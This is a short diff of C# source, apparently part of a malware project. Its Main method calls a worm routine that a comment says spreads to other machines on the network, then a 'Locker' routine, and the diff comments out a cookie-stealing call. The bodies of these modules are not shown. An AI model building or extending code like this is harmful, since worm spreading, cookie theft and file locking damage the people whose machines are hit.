@@ -6,6 +6,9 @@ namespace gigas;
 
 public class Program
 {
+    
+    
+    
       public static  void  Main(string[] args)
     {
 
@@ -25,7 +28,7 @@ public class Program
         
         Worms.Entrypoint(args[1]);
         // attempt to spread itself to other machines on the same network.
-        Cookie.Theif();
+        // Cookie.Theif();
         Locker.Pos();
 
     }
